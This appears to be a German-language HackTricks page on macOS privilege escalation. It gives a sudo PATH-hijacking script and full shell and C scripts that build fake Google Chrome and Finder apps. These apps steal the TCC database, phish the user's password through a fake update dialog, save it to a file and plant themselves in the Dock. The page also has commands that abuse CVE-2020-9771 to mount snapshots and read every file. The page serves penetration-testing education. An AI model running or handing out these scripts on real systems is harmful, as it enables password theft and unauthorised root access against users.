# macOS Privilegieneskalation

{{#include ../../banners/hacktricks-training.md}}

## TCC Privilegieneskalation

Wenn Sie hier sind, um nach TCC-Privilegieneskalation zu suchen, gehen Sie zu:

{{#ref}}
macos-security-protections/macos-tcc/
{{#endref}}

## Linux Privesc

Bitte beachten Sie, dass **die meisten Tricks zur Privilegieneskalation, die Linux/Unix betreffen, auch MacOS**-Maschinen betreffen werden. Sehen Sie sich also an:

{{#ref}}
../../linux-hardening/privilege-escalation/
{{#endref}}

## Benutzerinteraktion

### Sudo-Hijacking

Sie finden die ursprüngliche [Sudo-Hijacking-Technik im Beitrag zur Linux-Privilegieneskalation](../../linux-hardening/privilege-escalation/index.html#sudo-hijacking).

Allerdings **beibehält** macOS den **`PATH`** des Benutzers, wenn er **`sudo`** ausführt. Das bedeutet, dass ein anderer Weg, um diesen Angriff zu erreichen, darin bestehen würde, **andere Binärdateien zu hijacken**, die das Opfer weiterhin ausführen wird, wenn es **sudo** ausführt:
```bash
# Let's hijack ls in /opt/homebrew/bin, as this is usually already in the users PATH
cat > /opt/homebrew/bin/ls <<EOF
#!/bin/bash
if [ "\$(id -u)" -eq 0 ]; then
whoami > /tmp/privesc
fi
/bin/ls "\$@"
EOF
chmod +x /opt/homebrew/bin/ls

# victim
sudo ls
```
Beachten Sie, dass ein Benutzer, der das Terminal verwendet, höchstwahrscheinlich **Homebrew installiert** hat. Daher ist es möglich, Binärdateien in **`/opt/homebrew/bin`** zu hijacken.

### Dock-Imitation

Mit etwas **Social Engineering** könnten Sie **zum Beispiel Google Chrome imitieren** und tatsächlich Ihr eigenes Skript ausführen:

{{#tabs}}
{{#tab name="Chrome Impersonation"}}
Einige Vorschläge:

- Überprüfen Sie im Dock, ob es ein Chrome gibt, und entfernen Sie in diesem Fall **diesen Eintrag** und **fügen Sie** den **falschen** **Chrome-Eintrag an derselben Stelle** im Dock-Array hinzu.
```bash
#!/bin/sh

# THIS REQUIRES GOOGLE CHROME TO BE INSTALLED (TO COPY THE ICON)
# If you want to removed granted TCC permissions: > delete from access where client LIKE '%Chrome%';

rm -rf /tmp/Google\ Chrome.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Google\ Chrome.app/Contents/MacOS
mkdir -p /tmp/Google\ Chrome.app/Contents/Resources

# Payload to execute
cat > /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c <<EOF
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
char *cmd = "open /Applications/Google\\\\ Chrome.app & "
"sleep 2; "
"osascript -e 'tell application \"Finder\"' -e 'set homeFolder to path to home folder as string' -e 'set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias' -e 'set targetFolder to POSIX file \"/tmp\" as alias' -e 'duplicate file sourceFile to targetFolder with replacing' -e 'end tell'; "
"PASSWORD=\$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Enter your password to update Google Chrome:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"Applications:Google Chrome.app:Contents:Resources:app.icns\")' -e 'end tell' -e 'return userPassword'); "
"echo \$PASSWORD > /tmp/passwd.txt";
system(cmd);
return 0;
}
EOF

gcc /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c -o /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome
rm -rf /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c

chmod +x /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

# Info.plist
cat << EOF > /tmp/Google\ Chrome.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Google Chrome</string>
<key>CFBundleIdentifier</key>
<string>com.google.Chrome</string>
<key>CFBundleName</key>
<string>Google Chrome</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Google Chrome
cp /Applications/Google\ Chrome.app/Contents/Resources/app.icns /tmp/Google\ Chrome.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Google Chrome.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
sleep 0.1
killall Dock
```
{{#endtab}}

{{#tab name="Finder Impersonation"}}
Einige Vorschläge:

- Sie **können den Finder nicht aus dem Dock entfernen**, also wenn Sie ihn zum Dock hinzufügen möchten, könnten Sie den gefälschten Finder direkt neben den echten setzen. Dazu müssen Sie **den gefälschten Finder-Eintrag am Anfang des Dock-Arrays hinzufügen**.
- Eine andere Möglichkeit ist, ihn nicht im Dock zu platzieren und ihn einfach zu öffnen, "Finder fragt, um den Finder zu steuern" ist nicht so seltsam.
- Eine weitere Möglichkeit, um **ohne Passwortabfrage** auf Root zu eskalieren, ist, den Finder wirklich nach dem Passwort zu fragen, um eine privilegierte Aktion auszuführen:
- Bitten Sie den Finder, eine neue **`sudo`**-Datei nach **`/etc/pam.d`** zu kopieren (Die Eingabeaufforderung, die nach dem Passwort fragt, wird anzeigen, dass "Finder sudo kopieren möchte")
- Bitten Sie den Finder, ein neues **Authorization Plugin** zu kopieren (Sie könnten den Dateinamen kontrollieren, sodass die Eingabeaufforderung, die nach dem Passwort fragt, anzeigen wird, dass "Finder Finder.bundle kopieren möchte")
```bash
#!/bin/sh

# THIS REQUIRES Finder TO BE INSTALLED (TO COPY THE ICON)
# If you want to removed granted TCC permissions: > delete from access where client LIKE '%finder%';

rm -rf /tmp/Finder.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Finder.app/Contents/MacOS
mkdir -p /tmp/Finder.app/Contents/Resources

# Payload to execute
cat > /tmp/Finder.app/Contents/MacOS/Finder.c <<EOF
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
char *cmd = "open /System/Library/CoreServices/Finder.app & "
"sleep 2; "
"osascript -e 'tell application \"Finder\"' -e 'set homeFolder to path to home folder as string' -e 'set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias' -e 'set targetFolder to POSIX file \"/tmp\" as alias' -e 'duplicate file sourceFile to targetFolder with replacing' -e 'end tell'; "
"PASSWORD=\$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Finder needs to update some components. Enter your password:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"System:Library:CoreServices:Finder.app:Contents:Resources:Finder.icns\")' -e 'end tell' -e 'return userPassword'); "
"echo \$PASSWORD > /tmp/passwd.txt";
system(cmd);
return 0;
}
EOF

gcc /tmp/Finder.app/Contents/MacOS/Finder.c -o /tmp/Finder.app/Contents/MacOS/Finder
rm -rf /tmp/Finder.app/Contents/MacOS/Finder.c

chmod +x /tmp/Finder.app/Contents/MacOS/Finder

# Info.plist
cat << EOF > /tmp/Finder.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Finder</string>
<key>CFBundleIdentifier</key>
<string>com.apple.finder</string>
<key>CFBundleName</key>
<string>Finder</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Finder
cp /System/Library/CoreServices/Finder.app/Contents/Resources/Finder.icns /tmp/Finder.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Finder.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
sleep 0.1
killall Dock
```
{{#endtab}}
{{#endtabs}}

## TCC - Root-Rechteausweitung

### CVE-2020-9771 - mount_apfs TCC-Umgehung und Rechteausweitung

**Jeder Benutzer** (auch unprivilegierte) kann einen Time Machine-Snapshot erstellen und einbinden und **auf ALLE Dateien** dieses Snapshots zugreifen.\
Die **einzige Berechtigung**, die benötigt wird, ist, dass die verwendete Anwendung (wie `Terminal`) **Vollzugriff auf die Festplatte** (FDA) benötigt (`kTCCServiceSystemPolicyAllfiles`), was von einem Administrator gewährt werden muss.
```bash
# Create snapshot
tmutil localsnapshot

# List snapshots
tmutil listlocalsnapshots /
Snapshots for disk /:
com.apple.TimeMachine.2023-05-29-001751.local

# Generate folder to mount it
cd /tmp # I didn it from this folder
mkdir /tmp/snap

# Mount it, "noowners" will mount the folder so the current user can access everything
/sbin/mount_apfs -o noowners -s com.apple.TimeMachine.2023-05-29-001751.local /System/Volumes/Data /tmp/snap

# Access it
ls /tmp/snap/Users/admin_user # This will work
```
Eine detailliertere Erklärung kann [**im Originalbericht gefunden werden**](https://theevilbit.github.io/posts/cve_2020_9771/)**.**

## Sensible Informationen

Dies kann nützlich sein, um Privilegien zu eskalieren:

{{#ref}}
macos-files-folders-and-binaries/macos-sensitive-locations.md
{{#endref}}

{{#include ../../banners/hacktricks-training.md}}
